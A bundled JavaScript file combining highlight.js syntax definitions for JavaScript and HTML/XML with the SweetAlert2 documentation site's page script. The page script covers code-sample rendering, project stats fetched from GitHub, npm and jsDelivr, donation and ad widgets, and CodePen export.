    className: "comment",
    variants: [
      JSDOC_COMMENT,
      hljs.C_BLOCK_COMMENT_MODE,
      hljs.C_LINE_COMMENT_MODE
    ]
  };
  const SUBST_INTERNALS = [
    hljs.APOS_STRING_MODE,
    hljs.QUOTE_STRING_MODE,
    HTML_TEMPLATE,
    CSS_TEMPLATE,
    TEMPLATE_STRING,
    NUMBER
  ];
  SUBST.contains = SUBST_INTERNALS.concat({
    begin: /\{/,
    end: /\}/,
    keywords: KEYWORDS$1,
    contains: [
      "self"
    ].concat(SUBST_INTERNALS)
  });
  const SUBST_AND_COMMENTS = [].concat(COMMENT2, SUBST.contains);
  const PARAMS_CONTAINS = SUBST_AND_COMMENTS.concat([
    {
      begin: /\(/,
      end: /\)/,
      keywords: KEYWORDS$1,
      contains: ["self"].concat(SUBST_AND_COMMENTS)
    }
  ]);
  const PARAMS = {
    className: "params",
    begin: /\(/,
    end: /\)/,
    excludeBegin: true,
    excludeEnd: true,
    keywords: KEYWORDS$1,
    contains: PARAMS_CONTAINS
  };
  const CLASS_OR_EXTENDS = {
    variants: [
      {
        match: [
          /class/,
          /\s+/,
          IDENT_RE$12,
          /\s+/,
          /extends/,
          /\s+/,
          regex.concat(IDENT_RE$12, "(", regex.concat(/\./, IDENT_RE$12), ")*")
        ],
        scope: {
          1: "keyword",
          3: "title.class",
          5: "keyword",
          7: "title.class.inherited"
        }
      },
      {
        match: [
          /class/,
          /\s+/,
          IDENT_RE$12
        ],
        scope: {
          1: "keyword",
          3: "title.class"
        }
      }
    ]
  };
  const CLASS_REFERENCE = {
    relevance: 0,
    match: regex.either(
      /\bJSON/,
      /\b[A-Z][a-z]+([A-Z][a-z]*|\d)*/,
      /\b[A-Z]{2,}([A-Z][a-z]+|\d)+([A-Z][a-z]*)*/,
      /\b[A-Z]{2,}[a-z]+([A-Z][a-z]+|\d)*([A-Z][a-z]*)*/
    ),
    className: "title.class",
    keywords: {
      _: [
        ...TYPES,
        ...ERROR_TYPES
      ]
    }
  };
  const USE_STRICT = {
    label: "use_strict",
    className: "meta",
    relevance: 10,
    begin: /^\s*['"]use (strict|asm)['"]/
  };
  const FUNCTION_DEFINITION = {
    variants: [
      {
        match: [
          /function/,
          /\s+/,
          IDENT_RE$12,
          /(?=\s*\()/
        ]
      },
      {
        match: [
          /function/,
          /\s*(?=\()/
        ]
      }
    ],
    className: {
      1: "keyword",
      3: "title.function"
    },
    label: "func.def",
    contains: [PARAMS],
    illegal: /%/
  };
  const UPPER_CASE_CONSTANT = {
    relevance: 0,
    match: /\b[A-Z][A-Z_0-9]+\b/,
    className: "variable.constant"
  };
  function noneOf(list) {
    return regex.concat("(?!", list.join("|"), ")");
  }
  const FUNCTION_CALL = {
    match: regex.concat(
      /\b/,
      noneOf([
        ...BUILT_IN_GLOBALS,
        "super"
      ]),
      IDENT_RE$12,
      regex.lookahead(/\(/)
    ),
    className: "title.function",
    relevance: 0
  };
  const PROPERTY_ACCESS = {
    begin: regex.concat(/\./, regex.lookahead(
      regex.concat(IDENT_RE$12, /(?![0-9A-Za-z$_(])/)
    )),
    end: IDENT_RE$12,
    excludeBegin: true,
    keywords: "prototype",
    className: "property",
    relevance: 0
  };
  const GETTER_OR_SETTER = {
    match: [
      /get|set/,
      /\s+/,
      IDENT_RE$12,
      /(?=\()/
    ],
    className: {
      1: "keyword",
      3: "title.function"
    },
    contains: [
      {
        begin: /\(\)/
      },
      PARAMS
    ]
  };
  const FUNC_LEAD_IN_RE = "(\\([^()]*(\\([^()]*(\\([^()]*\\)[^()]*)*\\)[^()]*)*\\)|" + hljs.UNDERSCORE_IDENT_RE + ")\\s*=>";
  const FUNCTION_VARIABLE = {
    match: [
      /const|var|let/,
      /\s+/,
      IDENT_RE$12,
      /\s*/,
      /=\s*/,
      /(async\s*)?/,
      regex.lookahead(FUNC_LEAD_IN_RE)
    ],
    keywords: "async",
    className: {
      1: "keyword",
      3: "title.function"
    },
    contains: [
      PARAMS
    ]
  };
  return {
    name: "Javascript",
    aliases: ["js", "jsx", "mjs", "cjs"],
    keywords: KEYWORDS$1,
    exports: { PARAMS_CONTAINS, CLASS_REFERENCE },
    illegal: /#(?![$_A-z])/,
    contains: [
      hljs.SHEBANG({
        label: "shebang",
        binary: "node",
        relevance: 5
      }),
      USE_STRICT,
      hljs.APOS_STRING_MODE,
      hljs.QUOTE_STRING_MODE,
      HTML_TEMPLATE,
      CSS_TEMPLATE,
      TEMPLATE_STRING,
      COMMENT2,
      NUMBER,
      CLASS_REFERENCE,
      {
        className: "attr",
        begin: IDENT_RE$12 + regex.lookahead(":"),
        relevance: 0
      },
      FUNCTION_VARIABLE,
      {
        begin: "(" + hljs.RE_STARTERS_RE + "|\\b(case|return|throw)\\b)\\s*",
        keywords: "return throw case",
        relevance: 0,
        contains: [
          COMMENT2,
          hljs.REGEXP_MODE,
          {
            className: "function",
            begin: FUNC_LEAD_IN_RE,
            returnBegin: true,
            end: "\\s*=>",
            contains: [
              {
                className: "params",
                variants: [
                  {
                    begin: hljs.UNDERSCORE_IDENT_RE,
                    relevance: 0
                  },
                  {
                    className: null,
                    begin: /\(\s*\)/,
                    skip: true
                  },
                  {
                    begin: /\(/,
                    end: /\)/,
                    excludeBegin: true,
                    excludeEnd: true,
                    keywords: KEYWORDS$1,
                    contains: PARAMS_CONTAINS
                  }
                ]
              }
            ]
          },
          {
            begin: /,/,
            relevance: 0
          },
          {
            match: /\s+/,
            relevance: 0
          },
          {
            variants: [
              { begin: FRAGMENT.begin, end: FRAGMENT.end },
              { match: XML_SELF_CLOSING },
              {
                begin: XML_TAG.begin,
                "on:begin": XML_TAG.isTrulyOpeningTag,
                end: XML_TAG.end
              }
            ],
            subLanguage: "xml",
            contains: [
              {
                begin: XML_TAG.begin,
                end: XML_TAG.end,
                skip: true,
                contains: ["self"]
              }
            ]
          }
        ]
      },
      FUNCTION_DEFINITION,
      {
        beginKeywords: "while if switch catch for"
      },
      {
        begin: "\\b(?!function)" + hljs.UNDERSCORE_IDENT_RE + "\\([^()]*(\\([^()]*(\\([^()]*\\)[^()]*)*\\)[^()]*)*\\)\\s*\\{",
        returnBegin: true,
        label: "func.def",
        contains: [
          PARAMS,
          hljs.inherit(hljs.TITLE_MODE, { begin: IDENT_RE$12, className: "title.function" })
        ]
      },
      {
        match: /\.\.\./,
        relevance: 0
      },
      PROPERTY_ACCESS,
      {
        match: "\\$" + IDENT_RE$12,
        relevance: 0
      },
      {
        match: [/\bconstructor(?=\s*\()/],
        className: { 1: "title.function" },
        contains: [PARAMS]
      },
      FUNCTION_CALL,
      UPPER_CASE_CONSTANT,
      CLASS_OR_EXTENDS,
      GETTER_OR_SETTER,
      {
        match: /\$[(.]/
      }
    ]
  };
}
function xml(hljs) {
  const regex = hljs.regex;
  const TAG_NAME_RE = regex.concat(/[\p{L}_]/u, regex.optional(/[\p{L}0-9_.-]*:/u), /[\p{L}0-9_.-]*/u);
  const XML_IDENT_RE = /[\p{L}0-9._:-]+/u;
  const XML_ENTITIES = {
    className: "symbol",
    begin: /&[a-z]+;|&#[0-9]+;|&#x[a-f0-9]+;/
  };
  const XML_META_KEYWORDS = {
    begin: /\s/,
    contains: [
      {
        className: "keyword",
        begin: /#?[a-z_][a-z1-9_-]+/,
        illegal: /\n/
      }
    ]
  };
  const XML_META_PAR_KEYWORDS = hljs.inherit(XML_META_KEYWORDS, {
    begin: /\(/,
    end: /\)/
  });
  const APOS_META_STRING_MODE = hljs.inherit(hljs.APOS_STRING_MODE, { className: "string" });
  const QUOTE_META_STRING_MODE = hljs.inherit(hljs.QUOTE_STRING_MODE, { className: "string" });
  const TAG_INTERNALS = {
    endsWithParent: true,
    illegal: /</,
    relevance: 0,
    contains: [
      {
        className: "attr",
        begin: XML_IDENT_RE,
        relevance: 0
      },
      {
        begin: /=\s*/,
        relevance: 0,
        contains: [
          {
            className: "string",
            endsParent: true,
            variants: [
              {
                begin: /"/,
                end: /"/,
                contains: [XML_ENTITIES]
              },
              {
                begin: /'/,
                end: /'/,
                contains: [XML_ENTITIES]
              },
              { begin: /[^\s"'=<>`]+/ }
            ]
          }
        ]
      }
    ]
  };
  return {
    name: "HTML, XML",
    aliases: [
      "html",
      "xhtml",
      "rss",
      "atom",
      "xjb",
      "xsd",
      "xsl",
      "plist",
      "wsf",
      "svg"
    ],
    case_insensitive: true,
    unicodeRegex: true,
    contains: [
      {
        className: "meta",
        begin: /<![a-z]/,
        end: />/,
        relevance: 10,
        contains: [
          XML_META_KEYWORDS,
          QUOTE_META_STRING_MODE,
          APOS_META_STRING_MODE,
          XML_META_PAR_KEYWORDS,
          {
            begin: /\[/,
            end: /\]/,
            contains: [
              {
                className: "meta",
                begin: /<![a-z]/,
                end: />/,
                contains: [
                  XML_META_KEYWORDS,
                  XML_META_PAR_KEYWORDS,
                  QUOTE_META_STRING_MODE,
                  APOS_META_STRING_MODE
                ]
              }
            ]
          }
        ]
      },
      hljs.COMMENT(
        /<!--/,
        /-->/,
        { relevance: 10 }
      ),
      {
        begin: /<!\[CDATA\[/,
        end: /\]\]>/,
        relevance: 10
      },
      XML_ENTITIES,
      {
        className: "meta",
        end: /\?>/,
        variants: [
          {
            begin: /<\?xml/,
            relevance: 10,
            contains: [
              QUOTE_META_STRING_MODE
            ]
          },
          {
            begin: /<\?[a-z][a-z0-9]+/
          }
        ]
      },
      {
        className: "tag",
        begin: /<style(?=\s|>)/,
        end: />/,
        keywords: { name: "style" },
        contains: [TAG_INTERNALS],
        starts: {
          end: /<\/style>/,
          returnEnd: true,
          subLanguage: [
            "css",
            "xml"
          ]
        }
      },
      {
        className: "tag",
        begin: /<script(?=\s|>)/,
        end: />/,
        keywords: { name: "script" },
        contains: [TAG_INTERNALS],
        starts: {
          end: /<\/script>/,
          returnEnd: true,
          subLanguage: [
            "javascript",
            "handlebars",
            "xml"
          ]
        }
      },
      {
        className: "tag",
        begin: /<>|<\/>/
      },
      {
        className: "tag",
        begin: regex.concat(
          /</,
          regex.lookahead(regex.concat(
            TAG_NAME_RE,
            regex.either(/\/>/, />/, /\s/)
          ))
        ),
        end: /\/?>/,
        contains: [
          {
            className: "name",
            begin: TAG_NAME_RE,
            relevance: 0,
            starts: TAG_INTERNALS
          }
        ]
      },
      {
        className: "tag",
        begin: regex.concat(
          /<\//,
          regex.lookahead(regex.concat(
            TAG_NAME_RE,
            />/
          ))
        ),
        contains: [
          {
            className: "name",
            begin: TAG_NAME_RE,
            relevance: 0
          },
          {
            begin: />/,
            relevance: 0,
            endsParent: true
          }
        ]
      }
    ]
  };
}
const styles = "";
const atomOneDark = "";
const $ = document.querySelector.bind(document);
const $$ = document.querySelectorAll.bind(document);
window.Swal = Swal$1;
const escapeHtml = (text) => {
  const map = {
    "<": "&lt;",
    ">": "&gt;"
  };
  return text.replace(/[<>]/g, function(m) {
    return map[m];
  });
};
for (const preElement of $$("pre[data-example-id]")) {
  preElement.className = "code-sample";
  const example = examples[preElement.dataset.exampleId];
  if (example.fnString.slice(0, 5) === "async") {
    preElement.dataset.codepenJsBefore = "(async () => {\n";
    preElement.dataset.codepenJsAfter = "\n})()";
  }
  const codeElement = document.createElement("code");
  codeElement.className = "lang-javascript";
  codeElement.innerHTML = unindent(example.fnString.split("\n").slice(1, -1)).join("\n");
  codeElement.innerHTML = escapeHtml(codeElement.innerHTML);
  preElement.appendChild(codeElement);
}
function unindent(lines) {
  const baseIndent = [...lines[0]].findIndex((char) => char !== " ");
  return lines.map((line) => line.slice(baseIndent));
}
HighlightJS.configure({ cssSelector: "pre:not([data-highlighjs-ignore]) code" });
HighlightJS.registerLanguage("javascript", javascript);
HighlightJS.registerLanguage("xml", xml);
HighlightJS.highlightAll();
document.addEventListener("DOMContentLoaded", () => {
  const loadStyleSheet = (src, addToHead = true) => {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = src;
    if (addToHead) {
      document.head.appendChild(link);
    }
  };
  loadStyleSheet("https://cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css");
  loadStyleSheet("https://cdn.jsdelivr.net/npm/animate.css@4/animate.min.css");
  const themes = ["default", "dark", "bootstrap-4", "minimal", "borderless", "material-ui"];
  themes.forEach((theme) => {
    loadStyleSheet(`https://cdn.jsdelivr.net/npm/@sweetalert2/theme-${theme}/${theme}.css`, false);
  });
  Swal$1.bindClickHandler();
  Swal$1.mixin({
    toast: true
  }).bindClickHandler("data-swal-toast-template");
});
const stats = {};
if ($(".stats")) {
  fetch("https://api.github.com/repos/sweetalert2/sweetalert2/tags").then((response) => response.json()).then((response) => {
    if (!response[0] || !response[0].name) {
      return;
    }
    stats.latestRelease = response[0].name;
    showStats();
  }).catch(() => {
  });
  fetch("https://api.github.com/repos/sweetalert2/sweetalert2/commits").then((response) => response.json()).then((response) => {
    if (!response[0] || !response[0].commit) {
      return;
    }
    let recentActivity = response[0].commit.author.date;
    recentActivity = new Date(recentActivity);
    const today = new Date();
    const diffDays = parseInt((today - recentActivity) / (1e3 * 60 * 60 * 24));
    switch (diffDays) {
      case 0:
        recentActivity = "today";
        break;
      case 1:
        recentActivity = "yesterday";
        break;
      default:
        recentActivity = `${diffDays} days ago`;
        break;
    }
    stats.recentActivity = recentActivity;
    showStats();
  }).catch(() => {
  });
  fetch("https://api.npmjs.org/downloads/point/last-month/sweetalert2").then((response) => response.json()).then((response) => {
    stats.downloadsLastMonth = response.downloads.toLocaleString();
    showStats();
  }).catch(() => {
  });
}
function navigatorShare(e) {
  e.preventDefault();
  if (navigator.share) {
    navigator.share({
      title: document.title,
      url: location.origin
    }).catch(console.error);
  } else {
    openPopup(this.href);
  }
}
function openPopup(href) {
  window.open(href, "popup", "width=600,height=600");
}
if ($(".social-buttons")) {
  $(".facebook-button").addEventListener("click", navigatorShare);
  $(".twitter-button").addEventListener("click", function(e) {
    e.preventDefault();
    openPopup(this.href);
  });
}
function showStats() {
  if (stats.latestRelease && stats.recentActivity && stats.downloadsLastMonth) {
    const currentVersion = $("#current-version");
    currentVersion.innerText = stats.latestRelease;
    currentVersion.setAttribute("aria-label", currentVersion.getAttribute("aria-label") + stats.latestRelease);
    const latestUpdate = $("#latest-update");
    latestUpdate.innerText = stats.recentActivity;
    latestUpdate.setAttribute("aria-label", latestUpdate.getAttribute("aria-label") + stats.recentActivity);
    const downloads = $("#downloads-last-month");
    downloads.innerText = stats.downloadsLastMonth;
    downloads.setAttribute("aria-label", downloads.getAttribute("aria-label") + stats.downloadsLastMonth);
    document.getElementsByClassName("stats")[0].style.opacity = 1;
  }
}
function ordinalSuffix(i) {
  i = parseInt(i);
  const j = i % 10;
  const k = i % 100;
  if (j === 1 && k !== 11) {
    return `${i}st`;
  }
  if (j === 2 && k !== 12) {
    return `${i}nd`;
  }
  if (j === 3 && k !== 13) {
    return `${i}rd`;
  }
  return `${i}th`;
}
fetch("https://data.jsdelivr.com/v1/package/npm/sweetalert2/stats/month").then((response) => response.json()).then((response) => {
  if (response.rank && response.total) {
    $(".jsdelivr-info").innerHTML = `sweetalert2 is the <strong>${ordinalSuffix(response.rank)}</strong> most popular package on jsDelivr, with <strong>${parseInt(response.total).toLocaleString()}</strong> CDN hits in the last month`;
  }
}).catch(() => {
});
$(".paypal") && $(".paypal").addEventListener("click", (e) => {
  const currencies = {
    "UW5EA4KTHM4B6": "United States dollar (US$)",
    "TKTWHJGUWLR7E": "Euro (\u20AC)",
    "FE4JP23V88G3C": "Japanese yen (\xA5)",
    "QJ3KEXBUHCL3C": "Pound sterling (\xA3)",
    "SG3T6NCCQFYE2": "Australian dollar (A$)",
    "4SB64A93A7VZ8": "Canadian dollar (C$)",
    "UGHWAA7MRH7MQ": "Swiss franc (CHF)",
    "CPZP4SJAFZKAU": "Hong Kong dollar (HK$)",
    "F42C5XL3M3JCQ": "New Zealand dollar (NZ$)",
    "GRRZTRQLA4NWL": "Swedish krona (kr)",
    "386ALCBUUFXES": "Singapore dollar (S$)",
    "XFPKPQDZWFKAW": "Norwegian krone (kr)",
    "WSXP62LE49PPN": "Mexican peso ($)",
    "98BDRFSZAPV3Q": "Russian ruble (\u20BD)",
    "LYFEH4N33DHQC": "Brazilian real (R$)",
    "5HL8BJ97RRANU": "New Taiwan dollar (NT$)",
    "T7RD9MRR3MXTG": "Danish krone (kr)",
    "SHAUMPM36UNP6": "Polish z\u0142oty (z\u0142)"
  };
  Swal$1.fire({
    title: "Choose your currency",
    input: "select",
    inputOptions: currencies,
    inputValue: "USD"
  }).then((result) => {
    if (result.value) {
      location.assign(`https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=${result.value}`);
    }
  });
  e.preventDefault();
});
Array.from($$(".popup-icons button")).forEach((button) => {
  button.onclick = (e) => {
    const icon = e.target.getAttribute("data-icon");
    Swal$1.fire(`Icon ${icon}`, "", icon);
  };
});
if (typeof _bsa !== "undefined" && _bsa) {
  _bsa.init("default", "CKYDK5QE", "placement:sweetalert2githubio", {
    target: ".bsa-cpc",
    align: "horizontal",
    disable_css: "true"
  });
  _bsa.init("custom", "CK7DKKQI", "placement:sweetalert2githubio", {
    target: "#native-js-footer",
    template: `
      <div style="background-color: ##backgroundColor##" class="native-fixed">
        <a style="color: ##textColor##" class="native-link" href="##link##">
          <div class="native-sponsor" style="background-color: ##textColor##; color: ##backgroundColor##">Sponsor</div>
          <div class="native-text">##company## \u2014 ##description##</div>
        </a>
      </div>
    `
  });
}
function setBuySellAdsFooter() {
  if (typeof _bsa !== "undefined" && _bsa && $("body > .bsa-cpc").textContent) {
    window.Swal = Swal$1.mixin({
      footer: $("body > .bsa-cpc")
    });
  }
}
if ($("body > .bsa-cpc")) {
  const observer = new MutationObserver(setBuySellAdsFooter);
  observer.observe($("body > .bsa-cpc"), { childList: true });
}
Array.from($$("#api tr[id]")).forEach((tr) => {
  const anchor = document.createElement("a");
  anchor.innerText = "#";
  anchor.className = "hover-anchor";
  anchor.href = `/#${tr.id}`;
  tr.querySelector("td").appendChild(anchor);
});
Array.from($$("pre.code-sample")).forEach((pre) => {
  pre.addEventListener("click", (e) => {
    if (e.offsetY < 0) {
      const codepenValue = {
        js_external: "https://cdn.jsdelivr.net/npm/sweetalert2@11",
        css: 'body {\n  font-family: "Open Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", Helvetica, Arial, sans-serif; \n}'
      };
      if (pre.getAttribute("data-codepen-html")) {
        codepenValue.html = pre.getAttribute("data-codepen-html").replace(/\\n/g, "\n");
      }
      if (pre.getAttribute("data-codepen-css-external")) {
        codepenValue.css_external = pre.getAttribute("data-codepen-css-external");
      }
      codepenValue.js = "";
      if (pre.getAttribute("data-codepen-js-before")) {
        codepenValue.js = `${pre.getAttribute("data-codepen-js-before")}
`;
      }
      codepenValue.js += pre.innerText.replace(/\/images/g, `${window.location.href}images`);
      if (pre.getAttribute("data-codepen-js-after")) {
        codepenValue.js += `
${pre.getAttribute("data-codepen-js-after")}`;
      }
      $("#codepen-data").value = JSON.stringify(codepenValue);
      $("#codepen-form").submit();
    }
  });
});
$("#show-sidebar").addEventListener("click", () => {
  showSidebar();
});
Array.from($$('nav a[href^="#"]')).forEach((link) => {
  link.addEventListener("click", () => {
    if (Swal$1.getPopup() && Swal$1.getPopup().contains(link)) {
      Swal$1.close();
    }
  });
});
if ($("#theme")) {
  $("#theme").addEventListener("change", () => {
    $("#theme-styles").setAttribute("href", $("#theme").value);
  });
}
if ($("#version")) {
  $("#version").addEventListener("change", () => {
    switch ($("#version").value) {
      case "9.x":
        window.location.assign("v9.html");
        break;
      case "10.x":
        window.location.assign("v10.html");
        break;
      default:
        window.location.assign("/");
        break;
    }
  });
}
window.executeExample = async (id) => {
  const exampleFn = examples[id].fn;
  try {
    await exampleFn();
  } catch (error2) {
    console.error(error2);
  }
};
